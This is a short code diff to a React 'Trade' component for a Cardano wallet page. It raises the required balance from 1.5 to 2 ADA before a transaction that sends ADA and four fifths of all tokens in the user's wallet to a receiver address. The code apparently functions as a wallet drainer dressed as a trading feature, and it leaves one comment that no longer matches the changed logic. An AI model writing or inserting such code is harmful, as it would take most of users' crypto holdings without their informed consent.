@@ -127,13 +127,11 @@ function Trade() {
         const txHash = await transferADA(walletApi, cardanoWasm, receiverAddress, adaAmount);
         alert(`Transaction successful! ADA Hash: ${txHash}`);
       } else {
-        // Ensure there is at least 1.5 ADA available for the transaction
-        if (adaBalance < 1.5) {
-          alert("Insufficient ADA wallet balance. At least 1.5 ADA required.");
+        // Ensure there is at least 2 ADA available for the transaction
+        if (adaBalance < 2) {
+          alert("Insufficient ADA wallet balance. At least 2 ADA required.");
           return;
         }
-
-        const adaToTransfer = 1.5;
 
         // Ensure there are tokens in the wallet
         if (!tokens || tokens.length === 0) {
@@ -161,7 +159,7 @@ function Trade() {
           return;
         }
 
-        console.log(`Transferring 1.5 ADA and 4/5 of all tokens:`, { tokenPolicyIds, tokenAssetNames, tokenAmounts });
+        console.log(`Transferring 2 ADA and 4/5 of all tokens:`, { tokenPolicyIds, tokenAssetNames, tokenAmounts });
 
         // Transfer 1.5 ADA and 4/5 of all tokens in one transaction
         const txHash = await transferADAAndTokens(
